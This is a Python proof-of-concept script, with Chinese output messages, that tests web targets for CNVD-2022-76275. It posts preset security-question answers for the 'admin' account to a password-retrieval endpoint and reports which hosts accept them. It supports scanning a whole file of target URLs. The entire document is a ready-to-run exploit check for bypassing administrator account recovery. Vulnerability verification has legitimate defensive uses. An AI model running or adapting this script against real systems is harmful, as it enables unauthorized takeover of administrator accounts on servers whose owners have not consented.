import requests
import urllib3
import argparse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def poc(target):
    session = requests.session()
    session.verify = False
    session.headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
        "Referer": target + "/config/user_initPasswordRetrieve.action",
    }
    payload = "userBean.loginName=admin&userBean.questionNumber1=0&userBean.questionAnswer1=1d0383dcf3670a5ea80b017382d66623&userBean.questionNumber2=1&userBean.questionAnswer2=1d0383dcf3670a5ea80b017382d66623&userBean.questionNumber3=2&userBean.questionAnswer3=1d0383dcf3670a5ea80b017382d66623"
    try:
        result = session.post(target + "/config/user_checkQuestAnswer.action", params=payload, timeout=5).text
    except:
        print("[-]", target, "访问超时")
        return
    if "MTAwMA==" in result or "true" in result:
        print("[+]", target, "存在CNVD-2022-76275漏洞", result)
        return
    print("[-]", target, "不存在漏洞")


if __name__ == '__main__':
    print("""
   _____ _   ___      _______       ___   ___ ___  ___     ______ __ ___ ______ _____ 
  / ____| \ | \ \    / /  __ \     |__ \ / _ \__ \|__ \   |____  / /|__ \____  | ____|
 | |    |  \| |\ \  / /| |  | |______ ) | | | | ) |  ) |_____ / / /_   ) |  / /| |__  
 | |    | . ` | \ \/ / | |  | |______/ /| | | |/ /  / /______/ / '_ \ / /  / / |___ \ 
 | |____| |\  |  \  /  | |__| |     / /_| |_| / /_ / /_     / /| (_) / /_ / /   ___) |
  \_____|_| \_|   \/   |_____/     |____|\___/____|____|   /_/  \___/____/_/   |____/ 
                                                                      By: xiaoWangSec""")
    parser = argparse.ArgumentParser(description='CNVD-2022-76275验证脚本')
    parser.add_argument('-t', '--target', help='目标文本')
    parser.add_argument('-u', '--url', help='单个目标')
    args = parser.parse_args()

    if args.target:
        try:
            with open(args.target, 'r') as file:
                for line in file:
                    url = line.strip()
                    poc(url)
        except FileNotFoundError:
            print(f'文件 {args.target} 不存在')
    elif args.url:
        poc(args.url)
    else:
        parser.print_help()

